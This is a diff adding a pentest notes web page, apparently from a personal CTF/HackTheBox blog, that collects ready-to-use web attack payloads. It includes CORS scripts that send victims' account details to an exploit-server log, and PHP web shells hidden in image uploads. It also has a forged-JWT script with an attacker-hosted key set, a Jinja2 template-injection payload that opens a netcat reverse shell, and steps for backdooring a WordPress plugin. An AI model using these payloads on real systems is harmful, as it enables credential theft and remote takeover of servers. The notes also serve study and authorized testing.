@@ -1,0 +1,243 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>Notes - Web // meowmeowattack</title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.105.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="meowmeowattack" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://meowmeowattack.github.io/css/main.min.0fb49e70a30412f97ddfc418e18fefef1d9fcdebe45f634dbbba768b00fe1eec.css" />
+
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Notes - Web"/>
+<meta name="twitter:description" content="beef # change port to 3000 &gt; vi /etc/beef-xss/config.yaml &gt; journalctl -u beef-xss &gt; systemctl stop beef-xss.service;beef-xss cors tools: corscanner, ucors origin reflection &lt;script&gt; var req = new XMLHttpRequest(); req.onload = reqListener; req.open(&#39;get&#39;,&#39;$url/accountDetails&#39;,true); req.withCredentials = true; req.send(); function reqListener() { location=&#39;/log?key=&#39;&#43;this.responseText; }; &lt;/script&gt; null origin &lt;iframe sandbox=&#34;allow-scripts allow-top-navigation allow-forms&#34; srcdoc=&#34;&lt;script&gt; var req = new XMLHttpRequest(); req.onload = reqListener; req.open(&#39;get&#39;,&#39;$url/accountDetails&#39;,true); req.withCredentials = true; req.send(); function reqListener() { location=&#39;$exploit-server-url/log?key=&#39;&#43;encodeURIComponent(this.responseText); }; &lt;/script&gt;&#34;&gt;&lt;/iframe&gt; insecure protocol &lt;script&gt; document."/>
+
+    <meta property="og:title" content="Notes - Web" />
+<meta property="og:description" content="beef # change port to 3000 &gt; vi /etc/beef-xss/config.yaml &gt; journalctl -u beef-xss &gt; systemctl stop beef-xss.service;beef-xss cors tools: corscanner, ucors origin reflection &lt;script&gt; var req = new XMLHttpRequest(); req.onload = reqListener; req.open(&#39;get&#39;,&#39;$url/accountDetails&#39;,true); req.withCredentials = true; req.send(); function reqListener() { location=&#39;/log?key=&#39;&#43;this.responseText; }; &lt;/script&gt; null origin &lt;iframe sandbox=&#34;allow-scripts allow-top-navigation allow-forms&#34; srcdoc=&#34;&lt;script&gt; var req = new XMLHttpRequest(); req.onload = reqListener; req.open(&#39;get&#39;,&#39;$url/accountDetails&#39;,true); req.withCredentials = true; req.send(); function reqListener() { location=&#39;$exploit-server-url/log?key=&#39;&#43;encodeURIComponent(this.responseText); }; &lt;/script&gt;&#34;&gt;&lt;/iframe&gt; insecure protocol &lt;script&gt; document." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://meowmeowattack.github.io/notes/2a-web/" /><meta property="article:section" content="notes" />
+<meta property="article:published_time" content="2022-07-10T23:18:05+13:00" />
+<meta property="article:modified_time" content="2022-07-10T23:18:05+13:00" />
+
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://meowmeowattack.github.io/"><img class="app-header-avatar" src="/avatar.jpg" alt="meowmeowattack" /></a>
+      <span class="app-header-title">meowmeowattack</span>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/">/meow</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/htb/">/htb</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/notes/">/notes</a>
+      </nav>
+      <p>the meow of pentest</p>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">Notes - Web</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Jul 10, 2022
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          2 min read
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <h1 id="beef">beef</h1>
+<pre tabindex="0"><code># change port to 3000
+&gt; vi /etc/beef-xss/config.yaml
+&gt; journalctl -u beef-xss
+&gt; systemctl stop beef-xss.service;beef-xss
+</code></pre><h1 id="cors">cors</h1>
+<ul>
+<li>tools: corscanner, ucors</li>
+<li>origin reflection</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">req</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">onload</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">reqListener</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#39;get&#39;</span>,<span style="color:#e6db74">&#39;$url/accountDetails&#39;</span>,<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">withCredentials</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">send</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">reqListener</span>() {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">location</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;/log?key=&#39;</span><span style="color:#f92672">+</span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">responseText</span>;
+</span></span><span style="display:flex;"><span>    };
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;</span>
+</span></span></code></pre></div><ul>
+<li>null origin</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">iframe</span> <span style="color:#a6e22e">sandbox</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;allow-scripts allow-top-navigation allow-forms&#34;</span> <span style="color:#a6e22e">srcdoc</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&lt;script&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    var req = new XMLHttpRequest();
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    req.onload = reqListener;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    req.open(&#39;get&#39;,&#39;$url/accountDetails&#39;,true);
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    req.withCredentials = true;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    req.send();
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    function reqListener() {
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        location=&#39;$exploit-server-url/log?key=&#39;+encodeURIComponent(this.responseText);
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    };
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;/script&gt;&#34;</span><span style="color:#f92672">&gt;&lt;</span><span style="color:#960050;background-color:#1e0010">/iframe&gt;</span>
+</span></span></code></pre></div><ul>
+<li>insecure protocol</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>    document.<span style="color:#a6e22e">location</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://stock.$your-lab-url/?productId=4&lt;script&gt;var req = new XMLHttpRequest(); req.onload = reqListener; req.open(&#39;get&#39;,&#39;https://$your-lab-url/accountDetails&#39;,true); req.withCredentials = true;req.send();function reqListener() {location=&#39;https://$exploit-server-url/log?key=&#39;%2bthis.responseText; };%3c/script&gt;&amp;storeId=1&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;</span>
+</span></span></code></pre></div><h1 id="graphql">graphql</h1>
+<ul>
+<li>graphqlmap</li>
+</ul>
+<pre tabindex="0"><code>&gt; graphqlmap -u http://&lt;ip&gt;/graphql
+graphqlmap&gt; dump_via_introspection
+</code></pre><ul>
+<li><a href="https://github.com/doyensec/inql">https://github.com/doyensec/inql</a>, can be used to introspect and dump the schema into a json</li>
+</ul>
+<pre tabindex="0"><code>&gt; inql -t http://&lt;ip&gt;/graphql
+</code></pre><ul>
+<li><a href="https://gitlab.com/dee-see/graphql-path-enum">https://gitlab.com/dee-see/graphql-path-enum</a>, used to find path to the target object</li>
+</ul>
+<pre tabindex="0"><code>&gt; ./tools/graphql-path-enum --introspect-query-path &lt;ip&gt;/schema-2022-08-09-1660086719.json -t task
+</code></pre><ul>
+<li><a href="https://github.com/IvanGoncharov/graphql-voyager">https://github.com/IvanGoncharov/graphql-voyager</a>, visualise the schema</li>
+<li>create a schema using <code>inql</code> and serve the html using python3 -m http.server 80</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE html&gt;</span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">content</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/html;charset=utf-8&#34;</span> <span style="color:#a6e22e">http-equiv</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Content-Type&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">content</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;utf-8&#34;</span> <span style="color:#a6e22e">http-equiv</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;encoding&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">head</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">link</span> <span style="color:#a6e22e">rel</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://cdn.jsdelivr.net/npm/graphql-voyager/dist/voyager.css&#34;</span>/&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://cdn.jsdelivr.net/npm/react@16/umd/react.production.min.js&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://cdn.jsdelivr.net/npm/react-dom@16/umd/react-dom.production.min.js&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://cdn.jsdelivr.net/npm/graphql-voyager/dist/voyager.min.js&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;/<span style="color:#f92672">head</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;voyager&#34;</span>&gt;Loading...&lt;/<span style="color:#f92672">div</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">introspectionProvider</span>(<span style="color:#a6e22e">query</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;schema-2022-08-09-1660086719.json&#39;</span>, {
+</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">method</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;get&#39;</span>,
+</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">headers</span><span style="color:#f92672">:</span> { <span style="color:#e6db74">&#39;Content-Type&#39;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;application/json&#39;</span> },
+</span></span><span style="display:flex;"><span>        }).<span style="color:#a6e22e">then</span>((<span style="color:#a6e22e">response</span>) =&gt; <span style="color:#a6e22e">response</span>.<span style="color:#a6e22e">json</span>());
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">GraphQLVoyager</span>.<span style="color:#a6e22e">init</span>(document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;voyager&#39;</span>), {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">introspection</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">introspectionProvider</span>,
+</span></span><span style="display:flex;"><span>      });
+</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;/<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
+</span></span></code></pre></div><ul>
+<li><a href="https://github.com/dolevf/graphql-cop">https://github.com/dolevf/graphql-cop</a>, find potential vulnerabilities</li>
+</ul>
+<pre tabindex="0"><code>&gt; python3 graphql-cop.py -t http://&lt;ip&gt;/graphql -o json | tee log.json
+</code></pre><ul>
+<li><a href="https://github.com/nikitastupin/clairvoyance">https://github.com/nikitastupin/clairvoyance</a>, dump schema when introsepction is disabled</li>
+</ul>
+<pre tabindex="0"><code>&gt; python3 -m clairvoyance -vv -o payload.json -w /usr/share/wordlists/SecLists/Discovery/Web-Content/graphql.txt http://&lt;ip&gt;/graphql
+</code></pre><h1 id="image-upload">Image upload</h1>
+<ul>
+<li><a href="https://sushant747.gitbooks.io/total-oscp-guide/content/bypass_image_upload.html">https://sushant747.gitbooks.io/total-oscp-guide/content/bypass_image_upload.html</a></li>
+<li>rename extension</li>
+<li>add GIF89a before payload</li>
+</ul>
+<pre tabindex="0"><code>GIF89a;
+&lt;?
+system($_GET[&#39;cmd&#39;]);//or you can insert your complete shell code
+?&gt;
+</code></pre><ul>
+<li>Add comment</li>
+</ul>
+<pre tabindex="0"><code>&gt; exiftool -Comment=&#39;&lt;?php echo &#34;&lt;pre&gt;&#34;; system($_GET[&#39;cmd&#39;]); ?&gt;&#39; lo.jpg
+</code></pre><h1 id="jwks-spoofing">JWKS Spoofing</h1>
+<ul>
+<li><a href="https://mkjwk.org/">https://mkjwk.org/</a></li>
+<li>generate private/public key</li>
+<li>generate/modify token</li>
+<li>host jwks.json file</li>
+<li>attack</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> jwcrypto <span style="color:#f92672">import</span> jwk, jwe, jwt
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> jwcrypto.common <span style="color:#f92672">import</span> json_encode, json_decode
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>private_key <span style="color:#f92672">=</span> jwk<span style="color:#f92672">.</span>JWK<span style="color:#f92672">.</span>generate(kty<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;RSA&#39;</span>, alg<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;RS256&#39;</span>, size<span style="color:#f92672">=</span><span style="color:#ae81ff">4096</span>)
+</span></span><span style="display:flex;"><span>public_key <span style="color:#f92672">=</span> private_key<span style="color:#f92672">.</span>export(private_key<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>print(public_key)
+</span></span><span style="display:flex;"><span>token <span style="color:#f92672">=</span> jwt<span style="color:#f92672">.</span>JWT(
+</span></span><span style="display:flex;"><span>    header<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;typ&#34;</span>: <span style="color:#e6db74">&#34;JWT&#34;</span>, <span style="color:#e6db74">&#34;alg&#34;</span>: <span style="color:#e6db74">&#34;RS256&#34;</span>, <span style="color:#e6db74">&#34;jku&#34;</span>: <span style="color:#e6db74">&#34;http://hackmedia.htb/static/../redirect?url=10.10.16.22/jwks.json?00&#34;</span>},
+</span></span><span style="display:flex;"><span>    claims<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;user&#34;</span>: <span style="color:#e6db74">&#34;admin&#34;</span>}
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span>token<span style="color:#f92672">.</span>make_signed_token(private_key)
+</span></span><span style="display:flex;"><span>print(token<span style="color:#f92672">.</span>serialize())
+</span></span></code></pre></div><h1 id="lfi">LFI</h1>
+<ul>
+<li>enum process using LFI</li>
+</ul>
+<pre tabindex="0"><code>&gt; curl http://&lt;ip&gt;/index.php?page=../../../../../../../../../../proc/[100-500]/cmdline
+</code></pre><ul>
+<li>using wfuzz</li>
+</ul>
+<pre tabindex="0"><code>&gt; wfuzz http://&lt;ip&gt;/?path=FUZZ -w /usr/share/wordlists/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt
+</code></pre><h1 id="ssti">SSTI</h1>
+<ul>
+<li>jinja2 template injection</li>
+</ul>
+<pre tabindex="0"><code>{{request|attr(&#39;application&#39;)|attr(&#39;\x5f\x5fglobals\x5f\x5f&#39;)|attr(&#39;\x5f\x5fgetitem\x5f\x5f&#39;)(&#39;\x5f\x5fbuiltins\x5f\x5f&#39;)|attr(&#39;\x5f\x5fgetitem\x5f\x5f&#39;)(&#39;\x5f\x5fimport\x5f\x5f&#39;)(&#39;os&#39;)|attr(&#39;popen&#39;)(&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;ip&gt; 4444 &gt;/tmp/f&#39;)|attr(&#39;read&#39;)()}}
+</code></pre><h1 id="xss">XSS</h1>
+<ul>
+<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection</a></li>
+<li><a href="https://www.secjuice.com/bypass-xss-filters-using-javascript-global-variables/">https://www.secjuice.com/bypass-xss-filters-using-javascript-global-variables/</a></li>
+<li><a href="https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting">https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting</a></li>
+<li><a href="https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec">https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec</a></li>
+<li><a href="https://awesomeopensource.com/project/s0md3v/AwesomeXSS">https://awesomeopensource.com/project/s0md3v/AwesomeXSS</a></li>
+</ul>
+<h1 id="wordpress">wordpress</h1>
+<ul>
+<li>wpscan</li>
+</ul>
+<pre tabindex="0"><code>&gt; wpscan --url http://&lt;ip&gt;/ -e vp,vt,u,cb,dbe
+&gt; wpscan --url https://&lt;ip&gt;/ -e vp,vt,u,cb,dbe --disable-tls-checks
+
+# agressive detection
+&gt; wpscan --url http://&lt;ip&gt; -e p,u --plugins-detection aggressive
+</code></pre><ul>
+<li>backdoor through hello-dolly</li>
+</ul>
+<pre tabindex="0"><code>* update http://&lt;ip&gt;/wp-admin/plugin-editor.php?plugin=hello.php&amp;Submit=Select
+* activate plugin
+* browse to: http://&lt;ip&gt;/wp-content/plugins/hello-dolly/hello.php?cmd=ls
+* apply url encoded reverse shell: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;ip&gt; 4444 &gt;/tmp/f
+</code></pre><ul>
+<li>Check <code>wp-config.php</code> for db password</li>
+</ul>
+
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
